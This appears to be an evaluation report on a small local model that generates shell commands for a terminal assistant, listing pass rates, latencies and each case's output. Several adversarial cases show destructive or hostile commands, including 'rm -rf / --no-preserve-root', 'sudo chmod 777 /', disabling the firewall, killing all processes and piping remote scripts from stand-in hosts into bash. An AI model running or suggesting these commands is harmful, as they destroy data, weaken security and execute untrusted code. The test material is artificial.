# eval: llama-server / /Users/hridyaagrawal/.local/share/lexis/models/Qwen3.5-2B-M-TS-Q4_K_M.gguf (bake)
- mode: schema · dataset core.jsonl#83828218eadbc7f7 · repeat 2
- pass: 47/72 (65%)
- cold p50 2760ms p95 4652ms · warm p50 2630ms p95 4268ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 4797 | 4268 | brew --version ; node -v ; npm -v |
| u02 | ✓ | 2681 | 3119 | ls -l |
| u03 | ✓ | 3062 | 2441 | curl -s ifconfig.me |
| u04 | ✓ | 2845 | 2845 | lsof -i :3000 |
| u05 | ✓ | 2618 | 2834 | du -sh . |
| u06 | ✓ | 3015 | 3088 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -name '*.log' -mtime - |
| u07 | ✓ | 2408 | 2391 | ps aux | grep node |
| u08 | ✓ | 4078 | 5796 | git status ; git branch |
| u09 | ✓ | 3890 | 4892 | brew install ripgrep |
| u10 | ✓ | 3863 | 3401 | mkdir projects ; cd projects |
| u11 | ✓ | 2748 | 2636 | cd /Users/hridyaagrawal/Honey/React/smartterminal/lexis && tar czf archive.tar.g |
| u12 | ✓ | 2673 | 2251 | echo $PATH |
| u13 | ✗ | 3942 | 3895 | lsof -i :8080 | grep -E 'PID|COMMAND' ; kill -9 <PID> |
| u14 | ✓ | 2431 | 2351 | tail -20 /var/log/syslog |
| u15 | ✗ | 2807 | 2720 | brew list python3 |
| u16 | ✓ | 3997 | 4100 | brew update ; brew outdated |
| u17 | ✗ | 4571 | 3869 | zsh -l ; pwd ; ls -la |
| u18 | ✓ | 2532 | 2418 | git reset --soft HEAD~1 |
| u19 | ✗ | 2883 | 2882 | ls -lh /Users/hridyaagrawal/Honey/React/smartterminal/lexis | sort -k2 -nr | hea |
| u20 | ✓ | 2935 | 2682 | top -h -n 1 |
| u21 | ✗ | 2760 | 2795 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -name '*.js' -type f | |
| u22 | ✓ | 2452 | 2362 | brew services restart docker |
| u23 | ✓ | 3488 | 3022 | chmod +x script.sh ; bash script.sh |
| u24 | ✗ | 3985 | - | - |
| u25 | ✓ | 2836 | 2729 | curl -o ~/Downloads/file.zip https://example.com/file.zip |
| u26 | ✗ | 4049 | - | - |
| u27 | ✓ | 2585 | 2484 | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 2982 | 2810 | cd /Users/hridyaagrawal/Honey/React/smartterminal/lexis && rm -rf node_modules |
| u29 | ✓ | 2342 | 2570 | netstat -tlnp |
| u30 | ✓ | 6131 | 4539 | cd /Users/hridyaagrawal/Honey/React/smartterminal/lexis && unzip file.zip |
| u31 | ✗ | 4516 | 3006 | cat /Users/hridyaagrawal/Honey/React/smartterminal/lexis/app.log | grep -i error |
| u32 | ✗ | 2340 | - | - |
| u33 | ✗ | 4063 | - | - |
| u34 | ✗ | 2644 | 2287 | sudo getent hosts dns |
| u35 | ✓ | 2752 | 2748 | cp file.txt backup.txt |
| u36 | ✓ | 2872 | 2803 | mv old.txt new.txt |
| u37 | ✓ | 2661 | 2483 | du -sh ~/Downloads |
| u38 | ✓ | 2310 | 2071 | npm list -g |
| u39 | ✗ | 2556 | 2575 | open /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u40 | ✓ | 2601 | 2542 | sudo dscacheutil -flushcache -flushsys |
| a01 | ✓ | 2666 | 2410 | rm -rf "~" |
| a02 | ✗ | 4051 | - | - |
| a03 | ✓ | 2395 | 2209 | git push --force origin main |
| a04 | ✗ | 2723 | 2450 | curl -fsSL https://sketchy.example.com/install.sh | bash |
| a05 | ✗ | 2750 | 2455 | killall -9 $(ps aux | grep -v grep | awk '{print $2}') |
| a06 | ✓ | 2697 | 2630 | sudo chmod 777 / |
| a07 | ✗ | 2372 | 2516 | brew install tmux |
| a08 | ✗ | 4124 | - | - |
| a09 | ✓ | 2993 | 2729 | chmod -R 755 /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| a10 | ✓ | 2737 | 2733 | zsh -c 'find /var/log -type f -mtime +30 -delete' |
| a11 | ✗ | 2341 | 2306 | echo "Creating scheduled task..." |
| a12 | ✓ | 2291 | 2158 | git reset --hard HEAD~1 |
| a13 | ✓ | 2116 | 2063 | brew uninstall node |
| a14 | ✓ | 2412 | 2389 | sudo ufw disable |
| a15 | ✗ | 4652 | - | - |
| a16 | ✗ | 6577 | - | - |
| a17 | ✓ | 4589 | 2440 | rm -rf ~/Honey/React/smartterminal/lexis |
| a18 | ✗ | 3846 | - | - |
| a19 | ✓ | 3336 | 3140 | echo 'export PATH="${PATH:-/Users/hridyaagrawal/Honey/React/smartterminal/lexis} |
| a20 | ✓ | 2219 | 2238 | rm -rf / --no-preserve-root |
| u41 | ✗ | 3001 | 2832 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -type f -size +100M |
| u42 | ✓ | 2703 | 2601 | echo 'hello world' > my notes.txt |
| u43 | ✓ | 2425 | 2351 | git log --pretty=format:"%h %s" -5 |
| u44 | ✓ | 2354 | 2312 | curl -s https://example.com | cat |
| u45 | ✓ | 2916 | 2715 | ls -la /Users/hridyaagrawal/Honey/React/smartterminal/lexis | grep -v '^d' | wc  |
| u46 | ✗ | 2256 | 2100 | ifconfig |
| u47 | ✓ | 2732 | 2532 | df -h /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u48 | ✓ | 2978 | 2903 | whoami ; id |
| a21 | ✗ | 3155 | 2781 | echo '0 2 * * * /bin/bash -c "rm -rf /tmp/*" | /usr/local/bin/cron' |
| a22 | ✓ | 3504 | 3388 | cd /Users/hridyaagrawal/Honey/React/smartterminal/lexis && ln -s /Users/hridyaag |
| a23 | ✓ | 2389 | 2241 | rm -rf "*" |
| a24 | ✗ | 2291 | 2127 | curl https://x.io/i.sh | bash |
